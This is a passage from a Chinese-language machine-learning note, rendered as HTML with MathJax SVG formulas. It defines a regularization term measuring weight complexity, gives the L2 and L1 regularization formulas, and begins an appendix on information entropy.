60 749Z\"/></g></g></g></svg></mjx-container></span>。</p>\n<p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"5.848ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2585 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D445\" d=\"M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(759,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1148,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2196,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 的作用是衡量 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.05ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.371ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 1048 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g></g></g></svg></mjx-container></span> 的复杂程度，越复杂越大。</p>\n<ul>\n<li><p>L2正则化 <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.697ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"26.77ex\" height=\"4.847ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -950 11832.6 2142.2\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D445\" d=\"M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(759,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1148,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2196,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2862.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3918.6,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4501.6,0)\"><path data-c=\"2225\" d=\"M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5001.6,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(6049.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"2225\" d=\"M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(533,413) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(7263.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(8319.7,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(9069.3,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(600,-1084.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msubsup\" transform=\"translate(10680,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D464\" d=\"M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(749,413) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(749,-247) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span></p></li>\n<li><p>L1正则化 <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.697ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"27.78ex\" height=\"4.847ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -950 12278.9 2142.2\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D445\" d=\"M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(759,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1148,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2196,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2862.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3918.6,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4501.6,0)\"><path data-c=\"2225\" d=\"M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5001.6,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(6049.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"2225\" d=\"M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(533,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(7263.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(8319.7,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(9069.3,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(600,-1084.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(10680,0) translate(0 -0.5)\"><path data-c=\"7C\" d=\"M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(10958,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D464\" d=\"M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(749,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(12000.9,0) translate(0 -0.5)\"><path data-c=\"7C\" d=\"M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z\"/></g></g></g></svg></mjx-container></span></p></li>\n</ul>\n<h1 id=\"附录数学补充\">附录（数学补充）</h1>\n<h2 id=\"信息熵\">信息熵</h2>\n<p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.663ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"20.969ex\" height=\"2.36ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 9268.1 1043.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43B\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 